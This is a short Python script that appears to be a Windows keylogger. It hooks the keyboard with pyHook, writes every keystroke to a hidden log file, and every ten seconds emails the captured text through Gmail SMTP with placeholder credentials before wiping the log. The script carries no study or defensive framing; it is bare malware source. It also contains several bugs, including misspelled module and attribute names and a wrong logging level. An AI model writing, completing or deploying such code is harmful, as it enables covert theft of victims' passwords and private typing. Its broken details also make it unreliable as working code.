import pyHook, pythoncom, sys, logging
import smtplib
import time, datetime

file_ = 'c:\\secret\\binbash.txt'
wait_seconds = 10
timeout = time.time() + wait_seconds

def Timeout():
    if time.time() > timeout:
        return True
    else:
        return False

def SendEmail(user, pwd, receiver, subject, body):
    gmail_user = user
    gmail_password = pwd
    FROM = user
    TO = receiver if type(receiver) is list else [receiver]
    SUBJECT = subject
    TEXT = body
    Message = """\FROM: %s\nTo: %s\nSubject: %s\n\n%s""" % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_password)
        server.sendmail(FROM, TO, Message)
        server.close()
        print('Email sent')
    except:
        'Failed to deliver email'

def FormatAndSendEmail():
    with open(file_, 'r+') as f:
        actualdate = datetime.datetime.now().strftime("%Y-%m-%D %H:%M:%S")
        data = f.read().replace('\n', '')
        data = 'Captured log at ' + actualdate + '\n' + data
        SendEmail('Email', 'Password', 'Email', 'New log -'+ actualdate, data)

        f.seek(0)
        f.truncate()

def onKeyboardEvent(event):
    logging.basicConfig(filename=file_, level=logging.debug, format='%(message)s')
    logging.log(10, chr(event.Asccii))
    return True

hooks_manager = pyhook.HookManager()
hooks_manager.keyDown = onKeyboardEvent
hooks_manager.HookKeyboard()

while True:
    if Timeout():
        FormatAndSendEmail()
        timeout = time.time() + wait_seconds
    pythoncom.PumpWaitMessages()